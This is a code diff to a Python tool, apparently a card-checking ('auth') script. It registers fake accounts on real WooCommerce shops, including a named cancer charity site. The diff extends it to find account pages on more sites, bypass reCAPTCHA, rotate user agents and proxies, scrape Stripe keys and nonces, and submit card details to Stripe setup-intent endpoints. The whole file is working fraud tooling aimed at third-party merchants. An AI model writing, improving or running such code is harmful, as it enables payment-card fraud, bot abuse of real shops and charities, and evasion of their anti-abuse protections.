@@ -1,13 +1,14 @@
 """
-Stripe Auto Auth API (WooCommerce Stripe)
-=========================================
-Professional async WooCommerce Stripe auth flow:
-1. GET my-account/ → parse woocommerce-register-nonce
-2. POST my-account/ (register) with optional reCAPTcha bypass
-3. GET my-account/add-payment-method/ → parse publishableKey, accountId, createSetupIntentNonce
-4. POST api.stripe.com/v1/payment_methods
-5. POST wp-admin/admin-ajax.php (action=create_setup_intent, wcpay-payment-method, _ajax_nonce)
-Reference sites: melearning.co.uk, starr-shop.eu
+Stripe Auto Auth API (WooCommerce Stripe) — All varieties
+========================================================
+Supports all common WooCommerce account paths: /my-account/, /account/, /my-account-2/, etc.
+1. Discover account path (my-account, account, customer-area, ...)
+2. GET account_path → parse woocommerce-register-nonce
+3. POST account_path (register) with optional reCAPTcha bypass
+4. GET account_path + add-payment-method → parse Stripe keys & nonce
+5. POST api.stripe.com/v1/payment_methods
+6. POST wp-admin/admin-ajax.php (create_setup_intent / wc_stripe_create_and_confirm_setup_intent)
+Reference: starr-shop.eu, melearning.co.uk, nostomachforcancer.org, etc.
 """
 
 import re
@@ -17,12 +18,26 @@ import random
 import string
 import base64
 import logging
-from typing import Dict, Optional
+from typing import Dict, Optional, Tuple
 from urllib.parse import urlparse, parse_qs
 
 import aiohttp
 
 logger = logging.getLogger(__name__)
+
+# Common WooCommerce account path variants (order matters: try URL hint first, then common)
+ACCOUNT_PATH_CANDIDATES = [
+    "/my-account/",
+    "/account/",
+    "/my-account-2/",
+    "/myaccount/",
+    "/customer-area/",
+    "/customer-dashboard/",
+    "/dashboard/",
+    "/login/",
+    "/my-account-3/",
+    "/account-2/",
+]
 
 USER_AGENTS = [
     "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
@@ -38,6 +53,77 @@ def _random_email() -> str:
 
 def _random_password() -> str:
     return "".join(random.choices(string.ascii_letters + string.digits, k=12))
+
+
+def _extract_base_and_path_hint(site_url: str) -> Tuple[str, Optional[str]]:
+    """Return (base_url, path_hint). path_hint e.g. /account/ from .../account/add-payment-method/."""
+    url = site_url.strip().rstrip("/")
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+    parsed = urlparse(url)
+    base = f"{parsed.scheme or 'https'}://{parsed.netloc}".rstrip("/")
+    path = (parsed.path or "").strip().rstrip("/")
+    if not path:
+        return base, None
+    parts = [p for p in path.split("/") if p]
+    if not parts:
+        return base, None
+    first_seg = parts[0].lower()
+    for known in ("account", "my-account", "myaccount", "customer-area", "dashboard", "login", "my-account-2", "account-2", "customer-dashboard"):
+        if first_seg == known or first_seg.startswith(known + "-") or first_seg.startswith(known + "2"):
+            return base, "/" + parts[0] + "/"
+    if "account" in first_seg or "my-account" in first_seg:
+        return base, "/" + parts[0] + "/"
+    return base, None
+
+
+def _looks_like_woo_account(html: str) -> bool:
+    """True if page looks like WooCommerce account (register, login, add-payment-method, Stripe)."""
+    if not html:
+        return False
+    h = html.lower()
+    return (
+        "woocommerce" in h
+        or "register" in h
+        or "add-payment-method" in h
+        or "payment-method" in h
+        or "pk_live_" in h
+        or "pk_test_" in h
+        or "publishablekey" in h
+        or "stripe" in h
+        or "my-account" in h
+        or 'name="woocommerce-register-nonce"' in h
+        or "lost your password" in h
+        or "customer-area" in h
+    )
+
+
+async def _discover_account_path(
+    session: aiohttp.ClientSession,
+    base: str,
+    path_hint: Optional[str],
+    headers: Dict[str, str],
+    proxy: Optional[str],
+) -> Optional[str]:
+    """Try account path candidates; return prefix with trailing slash (e.g. /my-account/) or None."""
+    candidates = list(ACCOUNT_PATH_CANDIDATES)
+    if path_hint:
+        path_hint = path_hint if path_hint.endswith("/") else path_hint + "/"
+        if path_hint not in candidates:
+            candidates.insert(0, path_hint)
+    for prefix in candidates:
+        prefix = prefix if prefix.endswith("/") else prefix + "/"
+        url = base.rstrip("/") + prefix
+        try:
+            async with session.get(url, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=15)) as resp:
+                if resp.status != 200:
+                    continue
+                html = await resp.text()
+                if _looks_like_woo_account(html):
+                    return prefix
+        except Exception:
+            continue
+    return None
 
 
 def _captcha_detected(text: str) -> bool:
@@ -146,10 +232,8 @@ async def auto_stripe_auth(
     exp_year = ano[-2:] if len(ano) == 4 else ano
     exp_month = mes.zfill(2) if len(mes) == 1 else mes
 
-    url = site_url.strip().rstrip("/")
-    if not url.startswith(("http://", "https://")):
-        url = "https://" + url
-    base = url
+    base, path_hint = _extract_base_and_path_hint(site_url)
+    base = base.rstrip("/")
 
     ua = random.choice(USER_AGENTS)
     headers_base = {
@@ -169,15 +253,23 @@ async def auto_stripe_auth(
         session = aiohttp.ClientSession(timeout=timeout, connector=connector)
 
     try:
-        # 1) GET my-account/ → nonce
+        # 0) Discover account path (my-account, account, customer-area, etc.)
+        account_prefix = await _discover_account_path(session, base, path_hint, headers_base, proxy)
+        if not account_prefix:
+            account_prefix = "/my-account/"
+        acc_path = account_prefix.strip("/")
+        account_url = f"{base}/{acc_path}/" if acc_path else f"{base}/"
+        referer_path = "/" + acc_path + "/" if acc_path else "/my-account/"
+
+        # 1) GET account page → nonce
         async with session.get(
-            f"{base}/my-account/",
+            account_url,
             headers=headers_base,
             proxy=proxy,
         ) as resp:
             if resp.status != 200:
                 result["response"] = "SITE_HTTP_ERROR"
-                result["message"] = f"my-account returned {resp.status}"
+                result["message"] = f"Account page returned {resp.status}"
                 return result
             html_reg = await resp.text()
 
@@ -203,20 +295,20 @@ async def auto_stripe_auth(
             "wc_order_attribution_source_type": "typein",
             "wc_order_attribution_referrer": "(none)",
             "woocommerce-register-nonce": reg_nonce,
-            "_wp_http_referer": "/my-account/",
+            "_wp_http_referer": referer_path,
             "register": "Register",
         }
         reg_headers = {
             **headers_base,
             "Origin": base,
-            "Referer": f"{base}/my-account/",
+            "Referer": account_url,
             "Content-Type": "application/x-www-form-urlencoded",
             "Cache-Control": "no-cache",
             "Pragma": "no-cache",
         }
 
         async with session.post(
-            f"{base}/my-account/",
+            account_url,
             headers=reg_headers,
             data=data_register,
             proxy=proxy,
@@ -224,11 +316,11 @@ async def auto_stripe_auth(
             html1 = await resp.text()
 
         if _captcha_detected(html1):
-            g_token = await _recaptcha_bypass(session, html1, f"{base}/my-account/")
+            g_token = await _recaptcha_bypass(session, html1, account_url)
             if g_token:
                 data_register["g-recaptcha-response"] = g_token
                 async with session.post(
-                    f"{base}/my-account/",
+                    account_url,
                     headers=reg_headers,
                     data=data_register,
                     proxy=proxy,
@@ -241,45 +333,50 @@ async def auto_stripe_auth(
 
         await asyncio.sleep(0.3)
 
-        # 2) GET payment-methods/ then add-payment-method/ (some sites e.g. starr-shop.eu expect this order)
+        # 2) GET payment-methods/ then add-payment-method/ (try with and without trailing slash)
         pay_headers = {
             **headers_base,
-            "Referer": f"{base}/my-account/",
+            "Referer": account_url,
             "Cache-Control": "no-cache",
             "Pragma": "no-cache",
         }
-        async with session.get(
-            f"{base}/my-account/payment-methods/",
-            headers=pay_headers,
-            proxy=proxy,
-        ) as resp:
+        pm_list_url = f"{base}/{acc_path}/payment-methods/" if acc_path else f"{base}/my-account/payment-methods/"
+        async with session.get(pm_list_url, headers=pay_headers, proxy=proxy) as resp:
             if resp.status == 200:
                 await resp.text()
-        pay_headers["Referer"] = f"{base}/my-account/payment-methods/"
-        async with session.get(
+        add_pm_candidates = [
+            f"{base}/{acc_path}/add-payment-method/",
+            f"{base}/{acc_path}/add-payment-method",
             f"{base}/my-account/add-payment-method/",
-            headers=pay_headers,
-            proxy=proxy,
-        ) as resp:
-            if resp.status != 200:
-                result["response"] = "SITE_HTTP_ERROR"
-                result["message"] = f"add-payment-method returned {resp.status}"
-                return result
-            html_pay = await resp.text()
+        ]
+        pay_headers["Referer"] = pm_list_url
+        html_pay = None
+        add_pm_url = None
+        for add_pm in add_pm_candidates:
+            async with session.get(add_pm, headers=pay_headers, proxy=proxy) as resp:
+                if resp.status == 200:
+                    html_pay = await resp.text()
+                    add_pm_url = add_pm.rstrip("/") + "/" if not add_pm.endswith("/") else add_pm
+                    if _looks_like_woo_account(html_pay) or "pk_live_" in html_pay or "pk_test_" in html_pay or "publishablekey" in html_pay.lower():
+                        break
+        if not html_pay:
+            result["response"] = "SITE_HTTP_ERROR"
+            result["message"] = "add-payment-method page not found"
+            return result
 
         if _captcha_detected(html_pay):
-            g_token = await _recaptcha_bypass(session, html_pay, f"{base}/my-account/add-payment-method/")
+            g_token = await _recaptcha_bypass(session, html_pay, add_pm_url or add_pm_candidates[0])
             if not g_token:
                 result["response"] = "CAPTCHA_BLOCK"
                 result["message"] = "Payment page captcha failed"
                 return result
-            # Re-fetch with token in cookie or retry after bypass not always required for GET
             async with session.get(
-                f"{base}/my-account/add-payment-method/",
+                add_pm_url or add_pm_candidates[0],
                 headers=pay_headers,
                 proxy=proxy,
             ) as resp:
-                html_pay = await resp.text()
+                if resp.status == 200:
+                    html_pay = await resp.text()
 
         # Publishable key: JSON "publishableKey" first, then raw pk_live_/pk_test_ (e.g. starr-shop.eu)
         pks = None
@@ -409,12 +506,13 @@ async def auto_stripe_auth(
                 data.update(extra_fields)
             return data
 
+        add_pm_ref = add_pm_url or f"{base}/{acc_path}/add-payment-method/" if acc_path else f"{base}/my-account/add-payment-method/"
         ajax_headers = {
             "Accept": "*/*",
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
             "Accept-Language": "en-US,en;q=0.9",
             "Origin": base,
-            "Referer": f"{base}/my-account/add-payment-method/",
+            "Referer": add_pm_ref,
             "User-Agent": ua,
             "X-Requested-With": "XMLHttpRequest",
         }
